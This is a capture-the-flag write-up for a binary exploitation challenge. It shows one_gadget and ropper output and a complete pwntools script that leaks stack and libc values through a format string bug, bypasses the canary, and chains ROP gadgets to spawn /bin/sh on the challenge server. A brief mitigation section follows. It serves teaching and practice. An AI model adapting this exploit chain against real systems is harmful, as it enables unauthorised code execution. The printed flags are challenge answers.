# Intro to Pwning 3

## Solution

The difference here to the previous challenge is that we don't have a `WINgardium_leviosa` function that executes `/bin/sh` for us.
Therefore I used a technique called [ret2libc](https://www.youtube.com/watch?v=m17mV24TgwY) and a nice tool for finding [bespoke gadgets](https://www.youtube.com/watch?v=i_TUQfQS9Tg)
called [`one_gadget`](https://github.com/david942j/one_gadget). I additionally used [`ropper`](https://github.com/sashs/Ropper).
<br/> <br/>
I set up the [docker example by liveoverflow](https://github.com/LiveOverflow/pwn_docker_example) to get the correct version of libc, this is very important for our exploit to work on the server. Let's see where libc is loaded from:
```
$ ldd pwn3
    linux-vdso.so.1 (0x00007ffe8a693000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3753a58000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f3753e56000)
```
Now, run one_gadget on `/lib/x86_64-linux-gnu/libc.so.6`:
```
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0xe6b93 execve("/bin/sh", r10, r12)
constraints:
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe6b96 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xe6b99 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x10afa9 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
Seems like we found multiple addresses we jumped to and I actually picked the gadget at `0xe6b99` instead of `0x10afa9`... Don't ask me why, I probably missed it.
The magic gadget at `0xe6b99` I picked had the constraints that `rsi` and `rdx` had to be `NULL`.
I then used ropper to search for `pop rsi`:
```
$ ropper -f /lib/x86_64-linux-gnu/libc.so.6 --search "pop rsi; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi; ret

[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
0x000000000002709c: pop rsi; ret;
```
... and for `pop rdx`:
```
$ ropper -f /lib/x86_64-linux-gnu/libc.so.6 --search "pop rdx"
[LOAD] loading... 100%                                                                                                                                                                                             
[LOAD] removing double gadgets... 100%                                                                                                                                                                             
[INFO] Searching for gadgets: pop rdx                                                                                                                                                                              

[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
...
0x000000000011c421: pop rdx; pop r12; ret;
...
```

All I had to do now was putting all of that together:
```python
#!/usr/bin/env python3

from pwn import *

format_string = "|".join(["%p" for _ in range(65)])

r = remote("hax1.allesctf.net", 9102)

r.sendline(b"CSCG{NOW_GET_VOLDEMORT}")

r.sendline(format_string)
leaks = r.recvuntil("enter your magic spell:").decode("utf-8").split("|")

stack = int(leaks[39], 16)
canary = int(leaks[38], 16)
in_libc = int(leaks[2], 16)

padding = b"A" * 251
libc = in_libc - 0x111317

pop_rsi = libc + 0x2709c    # pop rsi; ret;
pop_rdx = libc + 0x11c421  # pop rdx; pop r12; ret; 
execve_bin_sh = libc + 0xe6b99  # execve("/bin/sh", rsi, rdx)

print("-"*35)
log.info(f"canary cookie: {hex(canary)}")
log.info(f"libc: {hex(libc)}")
log.info(f"rbp: {hex(stack)}")  # set the rbp to the stack
log.info(f"pop_rsi: {hex(pop_rsi)}")
log.info(f"pop_rdx: {hex(pop_rdx)}")
log.info(f"execve_bin_sh: {hex(execve_bin_sh)}")
print("-"*35)

payload = b"Expelliarmus\x00"
payload += padding

payload += p64(canary)
payload += p64(stack)

payload += p64(pop_rsi)
payload += p64(0)

payload += p64(pop_rdx)
payload += p64(0)
payload += p64(0)

payload += p64(execve_bin_sh)

r.sendline(payload)

r.interactive()
```

Flag: `CSCG{VOLDEMORT_DID_NOTHING_WRONG}`

## Mitigation

Mitigate the format string vulnerability by replacing `printf(read_buf);` with `printf("%s", read_buf);"` and the buffer overflow by using a safe alternative to `gets` such as
`fgets` that only reads as much characters as specified and set it to something smaller than the buffer size.
